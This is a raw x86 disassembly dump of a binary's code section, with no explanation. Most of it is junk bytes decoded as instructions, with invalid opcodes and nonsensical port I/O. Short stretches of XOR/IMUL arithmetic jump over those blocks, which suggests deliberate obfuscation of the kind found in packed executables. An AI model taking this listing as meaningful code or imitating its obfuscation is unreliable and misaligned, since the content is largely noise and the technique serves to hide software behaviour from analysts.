  40c75c:	lds    ebx,FWORD PTR [edx+0x4d6c773e]
  40c762:	pop    esi
  40c763:	js     0x40c743
  40c765:	dec    ecx
  40c766:	dec    esp
  40c767:	cmp    BYTE PTR [ebx],al
  40c769:	dec    edi
  40c76a:	ret    
  40c76b:	mov    BYTE PTR [ebp-0x6b9bd55f],al
  40c771:	daa    
  40c772:	pop    ebx
  40c773:	jns    0x40c79f
  40c775:	stos   DWORD PTR es:[edi],eax
  40c776:	sub    BYTE PTR [edx-0x10],0x84
  40c77a:	mov    ds:0xe147e675,eax
  40c77f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c780:	dec    esp
  40c781:	and    ebp,esi
  40c783:	outs   dx,DWORD PTR ds:[esi]
  40c784:	mov    eax,ds:0x940112ea
  40c789:	mov    bh,0x21
  40c78b:	clc    
  40c78c:	xchg   ecx,eax
  40c78d:	fwait
  40c78e:	jnp    0x40c7f2
  40c790:	outs   dx,DWORD PTR ds:[esi]
  40c791:	pop    ebx
  40c792:	cld    
  40c793:	mov    ah,0xc6
  40c795:	dec    eax
  40c796:	cmp    ebp,DWORD PTR [esi+0x54757d20]
  40c79c:	pushf  
  40c79d:	fs xchg esi,eax
  40c79f:	mov    ch,BYTE PTR [ebx]
  40c7a1:	out    dx,al
  40c7a2:	lea    ebp,[eax]
  40c7a4:	adc    DWORD PTR [esi],ebp
  40c7a6:	mov    ecx,0x800dde26
  40c7ab:	imul   esp,ecx,0xffffff8f
  40c7ae:	mov    ch,0x8f
  40c7b0:	aas    
  40c7b1:	and    DWORD PTR [edi+eax*2],ebp
  40c7b4:	xor    al,0x68
  40c7b6:	test   al,0x83
  40c7b8:	test   BYTE PTR [eax],dh
  40c7ba:	popf   
  40c7bb:	inc    edx
  40c7bc:	repnz in eax,dx
  40c7be:	cmp    DWORD PTR [esi+esi*4],eax
  40c7c1:	sbb    al,0xf2
  40c7c3:	jecxz  0x40c7e3
  40c7c5:	inc    ebp
  40c7c6:	adc    BYTE PTR [ebp+eiz*4-0x13],ah
  40c7ca:	lock dec ecx
  40c7cc:	xor    al,0xda
  40c7ce:	out    dx,al
  40c7cf:	(bad)  
  40c7d0:	cmp    eax,ecx
  40c7d2:	popa   
  40c7d3:	inc    edx
  40c7d4:	cs dec ecx
  40c7d6:	jo     0x40c7f5
  40c7d8:	xchg   esp,eax
  40c7d9:	ds mov esi,0xc98d713c
  40c7df:	push   esi
  40c7e0:	les    eax,FWORD PTR [ebp+ebp*4+0x2c158004]
  40c7e7:	pop    ecx
  40c7e8:	add    al,0x2b
  40c7ea:	fs inc esi
  40c7ec:	aam    0xf8
  40c7ee:	test   al,0xbf
  40c7f0:	fcom   QWORD PTR [ebx]
  40c7f2:	loop   0x40c872
  40c7f4:	mov    BYTE PTR [ebx-0x148a3fc0],ch
  40c7fa:	(bad)  
  40c7fc:	test   al,0xa0
  40c7fe:	repnz sti 
  40c800:	mov    BYTE PTR [esi+0x61],0x50
  40c804:	cmp    eax,0x835aef27
  40c809:	mov    eax,0x64c8323e
  40c80e:	jg     0x40c867
  40c810:	int3   
  40c811:	xchg   esp,eax
  40c812:	jno    0x40c7f0
  40c814:	add    BYTE PTR [ebx+0x62],dh
  40c817:	lods   eax,DWORD PTR ds:[esi]
  40c818:	shl    DWORD PTR [ebx-0x19],1
  40c81b:	xor    DWORD PTR [ebx+0x55],ebp
  40c81e:	and    BYTE PTR [ecx+0x1e3e5829],ah
  40c824:	pop    eax
  40c825:	mov    bl,0x42
  40c827:	mov    cl,BYTE PTR [eax]
  40c829:	pop    esp
  40c82a:	xchg   edi,eax
  40c82b:	mov    ebp,edi
  40c82d:	popf   
  40c82e:	nop
  40c82f:	sbb    al,0x3
  40c831:	(bad)  
  40c832:	js     0x40c818
  40c834:	test   al,0xf3
  40c836:	mov    ecx,0xff7e3299
  40c83b:	ins    BYTE PTR es:[edi],dx
  40c83c:	adc    bl,BYTE PTR [edx+0x7b]
  40c83f:	mov    ebx,0x9614a1ca
  40c844:	add    BYTE PTR [edx+0x3],bh
  40c847:	or     esi,DWORD PTR [esp+ebx*1]
  40c84a:	jge    0x40c7cd
  40c84c:	jne    0x40c8cd
  40c84e:	stos   DWORD PTR es:[edi],eax
  40c84f:	loop   0x40c8c4
  40c851:	icebp  
  40c852:	jb     0x40c8c0
  40c854:	mov    ebx,0x83a51cfd
  40c859:	pushf  
  40c85a:	out    0x52,eax
  40c85c:	arpl   WORD PTR [edi+0x75880c5b],ax
  40c862:	int3   
  40c863:	in     eax,0x2f
  40c865:	cmp    bl,BYTE PTR [ebp-0x23fb3bbf]
  40c86b:	or     eax,0x13a66068
  40c870:	mov    dl,0x45
  40c872:	fstp   st(7)
  40c874:	in     al,0xb1
  40c876:	cs aam 0xab
  40c879:	test   eax,0xda3cfce7
  40c87e:	shr    DWORD PTR ds:0x3149,1
  40c883:	dec    edx
  40c884:	dec    DWORD PTR [ebp+0x4e4307bd]
  40c88a:	mov    ah,0x27
  40c88c:	sahf   
  40c88d:	mov    al,0x30
  40c88f:	cld    
  40c890:	xor    ch,bl
  40c892:	pop    eax
  40c893:	adc    eax,0x6228424
  40c898:	ror    DWORD PTR [eax],1
  40c89a:	clc    
  40c89b:	xchg   esp,eax
  40c89c:	in     eax,0x29
  40c89e:	dec    ebp
  40c89f:	in     al,dx
  40c8a0:	add    al,0xe1
  40c8a2:	mov    dh,0x94
  40c8a4:	mov    al,ds:0xf9ad1dc8
  40c8a9:	out    dx,al
  40c8aa:	fcomip st,st(6)
  40c8ac:	sub    al,BYTE PTR [ebx]
  40c8ae:	cmp    ebp,DWORD PTR [edx-0x1977cbb8]
  40c8b4:	jb     0x40c90d
  40c8b6:	xor    eax,0xf136ac1c
  40c8bb:	sub    ebp,DWORD PTR [ebx]
  40c8bd:	call   0x9b26b916
  40c8c2:	push   esi
  40c8c3:	data16 and al,0x57
  40c8c6:	clc    
  40c8c7:	dec    ebx
  40c8c8:	test   al,0x14
  40c8ca:	out    0x8b,eax
  40c8cc:	popa   
  40c8cd:	push   0x2dca9ee6
  40c8d2:	jo     0x40c8fd
  40c8d4:	shl    BYTE PTR [edi],1
  40c8d6:	mov    edx,0xf973b28c
  40c8db:	std    
  40c8dc:	cmp    al,BYTE PTR [esi-0x72]
  40c8df:	cmp    al,0x33
  40c8e1:	jbe    0x40c8ef
  40c8e3:	push   cs
  40c8e4:	fadd   QWORD PTR [edx]
  40c8e6:	sbb    BYTE PTR [edx+0x1d78a541],al
  40c8ec:	and    al,0x8b
  40c8ee:	jge    0x40c8d8
  40c8f0:	xor    edi,eax
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	adc    eax,0xecffb8ed
  40c91d:	xchg   esp,eax
  40c91e:	jo     0x40c990
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c914
  40c925:	fiadd  WORD PTR [edi-0x1]
  40c928:	jecxz  0x40c8ed
  40c92a:	(bad)  [eax-0x5b]
  40c92d:	mov    esi,0x96953e5a
  40c932:	lea    ecx,[ecx+0x4a]
  40c935:	pop    ebx
  40c936:	jge    0x40c8bc
  40c938:	aaa    
  40c939:	std    
  40c93a:	push   ds
  40c93b:	nop
  40c93c:	shl    DWORD PTR [esi+0x153c720c],cl
  40c942:	pop    edx
  40c943:	mov    dh,BYTE PTR [edi-0x1fa3be7d]
  40c949:	and    DWORD PTR [ecx+0x5c],ebx
  40c94c:	add    ebx,DWORD PTR [ebx-0x28]
  40c94f:	sbb    eax,0x7db3578d
  40c954:	xchg   esp,eax
  40c955:	mov    eax,ds:0x7e08a1ef
  40c95a:	sbb    BYTE PTR [esi-0x15fea751],dh
  40c960:	jle    0x40c996
  40c962:	inc    edx
  40c963:	adc    DWORD PTR [ebp-0x6a],ecx
  40c966:	pop    edi
  40c967:	ja     0x40c981
  40c969:	fcomp  QWORD PTR [ebp+0x28]
  40c96c:	adc    cl,BYTE PTR [edi+0x2415ba96]
  40c972:	mov    edx,DWORD PTR [edx-0x54ad93c9]
  40c978:	sar    BYTE PTR [eax+0x4f1c2215],cl
  40c97e:	out    dx,eax
  40c97f:	cmp    al,0x5b
  40c981:	gs fs push cs
  40c984:	mov    cl,0xbf
  40c986:	out    dx,eax
  40c987:	sbb    BYTE PTR [edi-0x63],dl
  40c98a:	sbb    BYTE PTR [edi],cl
  40c98c:	mov    ebx,0x2c5b7f0b
  40c991:	daa    
  40c992:	lahf   
  40c993:	add    DWORD PTR [ebx+0x65],0x39274d08
  40c99a:	ds inc esp
  40c99c:	leave  
  40c99d:	(bad)  [ecx]
  40c99f:	jnp    0x40c9a2
  40c9a1:	and    eax,0xbdceba32
  40c9a6:	jg     0x40c96d
  40c9a8:	mov    eax,0x392bffe9
  40c9ad:	loopne 0x40ca04
  40c9af:	pop    ss
  40c9b0:	or     ebx,DWORD PTR [esi]
  40c9b2:	cmp    DWORD PTR [esi],ebp
  40c9b4:	jecxz  0x40ca28
  40c9b6:	jge    0x40c9f3
  40c9b8:	mov    WORD PTR [esp+esi*8-0x52],gs
  40c9bc:	cs add eax,0x249e8bbc
  40c9c2:	push   esp
  40c9c3:	in     eax,dx
  40c9c4:	mov    dh,0x4
  40c9c6:	out    0xe4,eax
  40c9c8:	push   edx
  40c9c9:	add    bh,BYTE PTR [ebx-0x5405a27b]
  40c9cf:	cmp    al,0xb6
  40c9d1:	repz sbb al,0xc
  40c9d4:	inc    edx
  40c9d5:	mov    ecx,0xa3fe161b
  40c9da:	aam    0xa3
  40c9dc:	fst    DWORD PTR [ecx-0x79f7ef62]
  40c9e2:	jbe    0x40ca5c
  40c9e4:	(bad)  
  40c9e5:	fwait
  40c9e6:	(bad)  
  40c9e9:	jp     0x40c9d2
  40c9eb:	mov    WORD PTR [edx-0x5],gs
  40c9ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9ef:	and    BYTE PTR [esi],cl
  40c9f1:	and    ebp,esp
  40c9f3:	mov    edx,0xc4efe9ca
  40c9f8:	sbb    bl,dl
  40c9fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9fb:	lahf   
  40c9fc:	adc    cl,BYTE PTR [eax+0x5a4638f8]
  40ca02:	clc    
  40ca03:	xor    ebp,0x5d
  40ca06:	std    
  40ca07:	dec    edx
  40ca08:	mov    ds:0x4300f58c,eax
  40ca0d:	and    dl,ch
  40ca0f:	inc    esi
  40ca10:	xor    al,0x3f
  40ca12:	cld    
  40ca13:	add    DWORD PTR [edi],ebp
  40ca15:	fldlg2 
  40ca17:	bound  eax,QWORD PTR fs:[ecx+edx*8]
  40ca1b:	xlat   BYTE PTR ds:[ebx]
  40ca1c:	add    DWORD PTR [ebx+0x4aaad6a4],edx
  40ca22:	imul   DWORD PTR [esi+0x3d]
  40ca25:	jae    0x40c9b0
  40ca27:	mov    dh,0xa7
  40ca29:	xor    DWORD PTR [ecx-0x21],0xdaf5a65f
  40ca30:	adc    al,0x98
  40ca32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca33:	mov    WORD PTR [ebp+0x3a],gs
  40ca36:	out    dx,eax
  40ca37:	xchg   esp,eax
  40ca38:	cmp    bl,BYTE PTR [eax-0x35]
  40ca3b:	or     edx,edx
  40ca3d:	jle    0x40ca63
  40ca3f:	jb     0x40ca15
  40ca41:	unpckhps xmm0,XMMWORD PTR [ebp+0x5f]
  40ca45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca46:	cdq    
  40ca47:	mov    edx,0x15882537
  40ca4c:	inc    ebx
  40ca4d:	inc    ecx
  40ca4e:	ret    0xd7cc
  40ca51:	xor    dh,BYTE PTR [eax+0x60]
  40ca54:	shr    BYTE PTR [edx-0x54],0x10
  40ca58:	xor    DWORD PTR [edi],esi
  40ca5a:	shr    BYTE PTR [eax-0x1cedda57],cl
  40ca60:	push   ebx
  40ca61:	pop    edi
  40ca62:	inc    ebx
  40ca63:	inc    edi
  40ca64:	fisubr WORD PTR [ecx]
  40ca66:	outs   dx,BYTE PTR ds:[esi]
  40ca67:	mov    ebx,DWORD PTR [esi+ebp*1+0x582f44d6]
  40ca6e:	add    eax,0xe7f2f1af
  40ca73:	inc    esp
  40ca74:	lea    esi,[ebx-0x4030d14c]
  40ca7a:	pop    es
  40ca7b:	rcl    BYTE PTR [ecx-0x2a07f56c],0x2e
  40ca82:	(bad)  
  40ca83:	and    eax,ebp
  40ca85:	mov    eax,ds:0x9f840213
  40ca8a:	sub    eax,DWORD PTR [edi-0x4b93edde]
  40ca90:	adc    BYTE PTR [esi-0x15],bh
  40ca93:	jnp    0x40ca4b
  40ca95:	xchg   ecx,eax
  40ca96:	lds    esi,FWORD PTR [ebp-0x27]
  40ca99:	fbstp  TBYTE PTR [ecx-0xe]
  40ca9c:	sub    ebp,DWORD PTR [ebp-0x44]
  40ca9f:	jp     0x40cabf
  40caa1:	ret    
  40caa2:	xor    al,0x32
  40caa4:	scas   eax,DWORD PTR es:[edi]
  40caa5:	retf   0xbce2
  40caa8:	hlt    
  40caa9:	(bad)  
  40caaa:	outs   dx,DWORD PTR ds:[esi]
  40caab:	push   esi
  40caac:	pop    ebx
  40caad:	out    dx,al
  40caae:	js     0x40cacd
  40cab0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cab1:	outs   dx,DWORD PTR ds:[esi]
  40cab2:	std    
  40cab3:	leave  
  40cab4:	es dec edi
  40cab6:	xchg   esp,eax
  40cab7:	shl    BYTE PTR [edi],cl
  40cab9:	xor    ecx,DWORD PTR [esi]
  40cabb:	mov    al,ds:0x8692f2a6
  40cac0:	push   esp
  40cac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cac2:	pop    edi
  40cac3:	fadd   QWORD PTR [esi-0x9cd402a]
  40cac9:	out    dx,eax
  40caca:	pop    ds
  40cacb:	add    dl,ah
  40cacd:	cmc    
  40cace:	arpl   sp,ax
  40cad0:	outs   dx,DWORD PTR ds:[esi]
  40cad1:	pop    es
  40cad2:	sub    BYTE PTR [ebx+0x36],0x52
  40cad6:	jns    0x40cb03
  40cad8:	mov    eax,0x104000dc
  40cadd:	xchg   edx,eax
  40cade:	cmp    ch,cl
  40cae0:	inc    ecx
  40cae1:	in     al,dx
  40cae2:	pop    es
  40cae3:	into   
  40cae4:	jmp    0x40cb1a
  40cae6:	pusha  
  40cae7:	int3   
  40cae8:	mov    eax,ds:0xd5466071
  40caed:	dec    eax
  40caee:	sub    DWORD PTR [edx-0x6b],0xd2285b7c
  40caf5:	aas    
  40caf6:	mov    ah,dh
  40caf8:	neg    BYTE PTR [edi+0x29fe193d]
  40cafe:	add    ebx,DWORD PTR [ebp+0xc84bf4e]
  40cb04:	into   
  40cb05:	mov    esi,DWORD PTR [edi+0x4e]
  40cb08:	mov    esp,0x6c2df69e
  40cb0d:	sub    ebx,DWORD PTR [esi+0x39]
  40cb10:	pop    ecx
  40cb11:	into   
  40cb12:	lds    ebx,FWORD PTR [edx+ebx*1-0x56]
  40cb16:	add    DWORD PTR [edx-0x1a],ebp
  40cb19:	repnz push 0x93d5d109
  40cb1f:	(bad)  
  40cb20:	sub    ebx,DWORD PTR [edx]
  40cb22:	add    BYTE PTR [esi+0x3c],dh
  40cb25:	and    DWORD PTR [eax+0x52],esi
  40cb28:	pop    ebx
  40cb29:	mov    ah,0xa1
  40cb2b:	dec    ebp
  40cb2c:	ficomp WORD PTR [esi+esi*1]
  40cb2f:	nop
  40cb30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb31:	test   DWORD PTR [ecx-0x7c0d6705],0x3bda3a4a
  40cb3b:	pop    edx
  40cb3c:	push   ss
  40cb3d:	lds    edi,FWORD PTR [edi]
  40cb3f:	outs   dx,DWORD PTR ds:[esi]
  40cb40:	out    0x82,eax
  40cb42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb43:	push   eax
  40cb44:	mov    bl,0x37
  40cb46:	mov    dl,0x9b
  40cb48:	aad    0x78
  40cb4a:	clc    
  40cb4b:	mov    edi,0x93f86a8e
  40cb50:	xlat   BYTE PTR ds:[ebx]
  40cb51:	xor    dl,BYTE PTR [ecx+0x551dc412]
  40cb57:	lahf   
  40cb58:	pop    ebp
  40cb59:	pop    esi
  40cb5a:	jp     0x40cb7a
  40cb5c:	fnstcw WORD PTR [ecx+edi*1+0x64]
  40cb60:	imul   esp,ecx,0xffffffef
  40cb63:	push   es
  40cb64:	push   esi
  40cb65:	xor    bl,BYTE PTR [ecx+0x53]
  40cb68:	in     eax,0xce
  40cb6a:	scas   al,BYTE PTR es:[edi]
  40cb6b:	lods   al,BYTE PTR ds:[esi]
  40cb6c:	xchg   esi,eax
  40cb6d:	pusha  
  40cb6e:	mov    esi,0xeb35566b
  40cb73:	jge    0x40cb99
  40cb75:	mov    edi,esp
  40cb77:	aas    
  40cb78:	adc    BYTE PTR [esi+0x188e7936],bh
  40cb7e:	lahf   
  40cb7f:	mov    ebx,0x1be8b3e9
  40cb84:	jb     0x40cbda
  40cb86:	pop    edi
  40cb87:	fcom   QWORD PTR [ebx+ecx*2+0x356c192d]
  40cb8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb8f:	scas   eax,DWORD PTR es:[edi]
  40cb90:	cmp    BYTE PTR [edi+0x19e8b456],ch
  40cb96:	stos   DWORD PTR es:[edi],eax
  40cb97:	ss pop ebp
  40cb99:	cmovb  ecx,ebx
  40cb9c:	lahf   
  40cb9d:	lds    eax,FWORD PTR [ecx+0x51]
  40cba0:	mov    eax,0x63e0205a
  40cba5:	into   
  40cba6:	popf   
  40cba7:	scas   al,BYTE PTR es:[edi]
  40cba8:	sbb    DWORD PTR [edi-0x72],edi
  40cbab:	mov    fs,WORD PTR [edx]
  40cbad:	jmp    0x1567:0x6207896f
  40cbb4:	enter  0x1012,0xe5
  40cbb8:	xlat   BYTE PTR ds:[ebx]
  40cbb9:	ret    0x2d6
  40cbbc:	push   eax
  40cbbd:	sbb    al,0x8c
  40cbbf:	cmp    BYTE PTR [edx],cl
  40cbc1:	ins    BYTE PTR es:[edi],dx
  40cbc2:	scas   eax,DWORD PTR es:[edi]
  40cbc3:	shr    ebx,0x3
  40cbc6:	data16 fwait
  40cbc8:	div    esi
  40cbca:	aas    
  40cbcb:	xor    ah,BYTE PTR [ecx+0x29]
  40cbce:	dec    ebp
  40cbcf:	clc    
  40cbd0:	aad    0x1a
  40cbd2:	call   0x86e0:0x4ccdeab6
  40cbd9:	pop    esp
  40cbda:	loopne 0x40cc06
  40cbdc:	out    0xad,al
  40cbde:	pop    eax
  40cbdf:	adc    al,0xc2
  40cbe1:	mov    dh,0xe7
  40cbe3:	mov    ebx,0x102c1421
  40cbe8:	mov    al,0xb2
  40cbea:	mov    al,0x57
  40cbec:	xor    bh,BYTE PTR [edx+0x5d00ab7a]
  40cbf2:	hlt    
  40cbf3:	xchg   ebp,eax
  40cbf4:	pop    esp
  40cbf5:	jl     0x40cc18
  40cbf7:	adc    eax,0xefff28f6
  40cbfc:	pop    edx
  40cbfd:	inc    eax
  40cbfe:	jl     0x40cbee
  40cc00:	js     0x40cbc1
  40cc02:	test   edx,edi
  40cc04:	lds    edx,FWORD PTR [edi+0x61ebda18]
  40cc0a:	push   ebx
  40cc0b:	inc    edx
  40cc0c:	or     eax,DWORD PTR [ebp+0x24e4f520]
  40cc12:	int    0xb0
  40cc14:	mov    bh,0x99
  40cc16:	jb     0x40cbda
  40cc18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc19:	cld    
  40cc1a:	add    BYTE PTR [edx+edi*8+0x18c4a899],ah
  40cc21:	jp     0x40cc95
  40cc23:	popa   
  40cc24:	cmp    DWORD PTR [ebx-0x30b989ca],eax
  40cc2a:	jp     0x40cc5a
  40cc2c:	fcmovnu st,st(0)
  40cc2e:	mov    esi,0x9b97ccd9
  40cc33:	bound  edi,QWORD PTR gs:[edi-0x77]
  40cc37:	outs   dx,BYTE PTR ds:[esi]
  40cc38:	clc    
  40cc39:	mov    dh,BYTE PTR [esi+0x11]
  40cc3c:	rol    DWORD PTR [ebp+0x3918232c],0xda
  40cc43:	and    BYTE PTR [esp+ebp*4+0x33],ah
  40cc47:	inc    esp
  40cc48:	aam    0x2d
  40cc4a:	adc    al,0x5
  40cc4c:	xchg   BYTE PTR [edi+0x5b0105fd],cl
  40cc52:	and    eax,0xa1c70a66
  40cc57:	or     al,BYTE PTR [esi]
  40cc59:	(bad)  
  40cc5a:	cmp    DWORD PTR [ebx],ebx
  40cc5c:	repz out 0xc6,al
  40cc5f:	jecxz  0x40cc9a
  40cc61:	dec    edi
  40cc62:	fist   WORD PTR [ecx+edi*1]
  40cc65:	fbstp  TBYTE PTR [edx+0x63]
  40cc68:	cmp    BYTE PTR [edx],bh
  40cc6a:	or     eax,0x614b6fb8
  40cc6f:	fisubr WORD PTR [eax]
  40cc71:	es mov bl,0xa7
  40cc74:	outs   dx,BYTE PTR ds:[esi]
  40cc75:	inc    edx
  40cc76:	rcr    dh,0x2f
  40cc79:	fsubp  st(1),st
  40cc7c:	jne    0x40cc99
  40cc7e:	shr    BYTE PTR [edx],cl
  40cc80:	or     al,0xb4
  40cc82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc83:	add    eax,0xf790a0c5
  40cc88:	jg     0x40cca7
  40cc8a:	jmp    0x40cc2f
  40cc8c:	scas   eax,DWORD PTR es:[edi]
  40cc8d:	jg     0x40cc88
  40cc8f:	scas   eax,DWORD PTR es:[edi]
  40cc90:	sub    esp,esp
  40cc92:	ret    
  40cc93:	shl    BYTE PTR [ebp+0x14],1
  40cc96:	adc    cl,BYTE PTR [edi-0x42]
  40cc99:	(bad)  
  40cc9a:	and    al,BYTE PTR [esi+eax*2-0x58]
  40cc9e:	mov    WORD PTR [ebx-0x30752030],ds
  40cca4:	jmp    0x40cc41
  40cca6:	push   edi
  40cca7:	ja     0x40cc74
  40cca9:	je     0x40cc75
  40ccab:	outs   dx,DWORD PTR ds:[esi]
  40ccac:	std    
  40ccad:	xor    DWORD PTR [ebx+0x564193bb],edi
  40ccb3:	sub    esp,DWORD PTR ds:0xefe03a27
  40ccb9:	jecxz  0x40cd0c
  40ccbb:	out    dx,al
  40ccbc:	mov    dh,0x5b
  40ccbe:	fimul  DWORD PTR ds:0xe1ae5a04
  40ccc4:	cli    
  40ccc5:	xor    edi,eax
  40ccc7:	add    edx,ecx
  40ccc9:	add    edi,ecx
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	adc    DWORD PTR [ebx-0xd],0x60
  40cd19:	jns    0x40cd26
  40cd1b:	nop
  40cd1c:	jo     0x40cd8e
  40cd1e:	lahf   
  40cd1f:	jge    0x40cd91
  40cd21:	jo     0x40ccad
  40cd23:	inc    ecx
  40cd24:	into   
  40cd25:	sub    dh,bl
  40cd27:	push   eax
  40cd28:	mov    esp,DWORD PTR [ebp-0x25]
  40cd2b:	add    ah,cl
  40cd2d:	adc    ah,ch
  40cd2f:	cmp    bl,BYTE PTR [edx]
  40cd31:	enter  0xce86,0x99
  40cd35:	mov    esp,0x385cc41d
  40cd3a:	dec    esp
  40cd3b:	xor    eax,0x56d47416
  40cd40:	mov    ebx,0xfbe0cfcf
  40cd45:	sub    al,0x3b
  40cd47:	add    ah,bl
  40cd49:	mov    al,0xce
  40cd4b:	cmp    al,BYTE PTR [ebp+eiz*4-0x6e437cdc]
  40cd52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd53:	jnp    0x40cdbf
  40cd55:	leave  
  40cd56:	dec    ebx
  40cd57:	mov    eax,ds:0xefc16a34
  40cd5c:	shl    esp,1
  40cd5e:	pushf  
  40cd5f:	test   eax,0xf95e51bc
  40cd64:	inc    esi
  40cd65:	xor    BYTE PTR [ebp-0xf],dh
  40cd68:	or     BYTE PTR [edi-0x13925878],bl
  40cd6e:	ret    0x6c8e
  40cd71:	pop    es
  40cd72:	retf   0xb49c
  40cd75:	pusha  
  40cd76:	adc    DWORD PTR [esi],ecx
  40cd78:	cmp    al,0xb3
  40cd7a:	mov    edi,0x38e288d2
  40cd7f:	in     eax,dx
  40cd80:	int3   
  40cd81:	push   ds
  40cd82:	adc    bh,ah
  40cd84:	in     eax,0xa6
  40cd86:	and    al,0x34
  40cd88:	outs   dx,BYTE PTR ds:[esi]
  40cd89:	lahf   
  40cd8a:	data16 mov dl,0xca
  40cd8d:	and    BYTE PTR [ecx+0x24419107],dh
  40cd93:	call   0xc77f38ad
  40cd98:	jecxz  0x40cdb4
  40cd9a:	aaa    
  40cd9b:	(bad)  
  40cd9c:	cmp    BYTE PTR [edx],ch
  40cd9e:	add    ecx,ebx
  40cda0:	xchg   edx,eax
  40cda1:	data16 mov al,ds:0xc6ad6f0d
  40cda7:	dec    ebx
  40cda8:	lahf   
  40cda9:	icebp  
  40cdaa:	sub    al,0x73
  40cdac:	sahf   
  40cdad:	xchg   edx,eax
  40cdae:	pop    esp
  40cdaf:	inc    esp
  40cdb0:	jns    0x40cda9
  40cdb2:	sbb    BYTE PTR [ecx],dl
  40cdb4:	xlat   BYTE PTR ds:[ebx]
  40cdb5:	mov    ds:0xf05b241c,al
  40cdba:	pop    eax
  40cdbb:	or     esi,edx
  40cdbd:	push   eax
  40cdbe:	lock popf 
  40cdc0:	push   edx
  40cdc1:	arpl   WORD PTR [ecx-0x5055889d],bx
  40cdc7:	mov    esp,0x2afd27a
  40cdcc:	jbe    0x40cdc7
  40cdce:	xchg   BYTE PTR [ebx+0x4c],bh
  40cdd1:	js     0x40ce08
  40cdd3:	jne    0x40cd98
  40cdd5:	mov    edi,0x64fe6da8
  40cdda:	xchg   edx,eax
  40cddb:	dec    eax
  40cddc:	mov    BYTE PTR ds:0x984b1bf0,ah
  40cde2:	and    al,0xab
  40cde4:	gs ins DWORD PTR es:[edi],dx
  40cde6:	add    eax,0xeeb6a05c
  40cdeb:	fcomip st,st(6)
  40cded:	jbe    0x40ce63
  40cdef:	xchg   ebp,eax
  40cdf0:	and    ebp,DWORD PTR [eax-0x2961082a]
  40cdf6:	mov    al,ds:0x5d8a4dcc
  40cdfb:	and    DWORD PTR [ecx*1+0x171b0fd1],ebp
  40ce02:	push   0x36
  40ce04:	dec    ecx
  40ce05:	loope  0x40ce3c
  40ce07:	aad    0x38
  40ce09:	and    bh,bh
  40ce0b:	int    0xfa
  40ce0d:	dec    ebp
  40ce0e:	ret    
  40ce0f:	pop    ebx
  40ce10:	iret   
  40ce11:	iret   
  40ce12:	lea    esp,ds:0x5fa9ea54
  40ce18:	ror    edx,0x17
  40ce1b:	out    dx,al
  40ce1c:	(bad)  
  40ce1d:	call   0xc1b3:0xfcb69304
  40ce24:	ss inc esi
  40ce26:	pop    esi
  40ce27:	sbb    DWORD PTR [ebx],ebp
  40ce29:	sahf   
  40ce2a:	call   0xce26:0x5ccf2d7d
  40ce31:	cmp    al,0x21
  40ce33:	out    dx,al
  40ce34:	xor    eax,0xc71ae827
  40ce39:	rcl    ebp,cl
  40ce3b:	jo     0x40cdef
  40ce3d:	jbe    0x40ce65
  40ce3f:	cld    
  40ce40:	and    DWORD PTR [eax+0x33],edx
  40ce43:	push   ds
  40ce44:	jge    0x40cdd2
  40ce46:	cmp    bh,bh
  40ce48:	cmc    
  40ce49:	outs   dx,BYTE PTR ds:[esi]
  40ce4a:	adc    DWORD PTR [ecx],esi
  40ce4c:	stos   BYTE PTR es:[edi],al
  40ce4d:	jns    0x40cdeb
  40ce4f:	mov    edi,0x4255ec98
  40ce54:	rcl    DWORD PTR [eax],cl
  40ce56:	loop   0x40cde8
  40ce58:	inc    ah
  40ce5a:	jecxz  0x40ce11
  40ce5c:	mov    ebx,0xaac1f4d4
  40ce61:	add    BYTE PTR es:[edx],dh
  40ce64:	sbb    ebx,DWORD PTR [ecx+0x61]
  40ce67:	mul    esp
  40ce69:	sub    ebp,DWORD PTR [esi]
  40ce6b:	jmp    0x76709bd9
  40ce70:	push   es
  40ce71:	jg     0x40ce51
  40ce73:	push   ss
